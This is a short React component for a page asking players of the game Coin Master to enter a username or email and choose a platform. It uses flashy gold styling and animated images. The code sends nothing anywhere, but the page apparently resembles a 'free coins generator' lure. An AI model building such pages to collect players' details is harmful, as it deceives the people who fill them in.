const Homepage = () => {
    return (
        <div className="h-screen bg-cover bg-center bg-no-repeat" style={{ backgroundImage: `url(${'https://d266key948fg17.cloudfront.net/uploads/16369872739c763d4d2f3aa502aaeba2891b5d8448.jpg'})` }}>
            <figure className="">
                <img src="https://d266key948fg17.cloudfront.net/uploads/16092706812cfcd4f149e83a5a4d47a8d9de077bb1.png" className="animate-pulse mx-auto" alt="" />
            </figure>

            <form className="w-2/6 mx-auto bg-black shadow-xl shadow-yellow-500 px-10 py-8 rounded-lg relative mt-10 space-y-5" style={{ boxShadow: '0 0 5px grey, 0 0 15px goldenrod, 0 0 20px goldenrod, 0 0 40px white, 0 0 70px goldenrod' }}>
                <figure className="absolute -top-7 left-1/2 -translate-x-1/2">
                    <img src="https://d266key948fg17.cloudfront.net/uploads/1503049344e5a4b9064a106ccb98c961c6b73fa271.png" className="h-16 w-16 animate-spin" />
                </figure>
                <h2 className="font-bold text-lg md:text-2xl xl:text-3xl text-slate-200 text-center">Please enter your Coin Master Username or Email and select your platform.</h2>
                <div className="relative">
                    <img src="https://d266key948fg17.cloudfront.net/uploads/1636988804a288ccbb279b1d36af81b92880d61cab.png" className="absolute left-2 top-1/2 -translate-y-1/2 rounded-full h-10 w-10"/>
                    <input type="text" className="py-6 px-3 !pl-14 font-semibold outline-none text-lg rounded-lg w-full" style={{ color: 'goldenrod', background: 'radial-gradient(black ,goldenrod )' }} />
                </div>

            </form>

        </div>
    );
};

export default Homepage;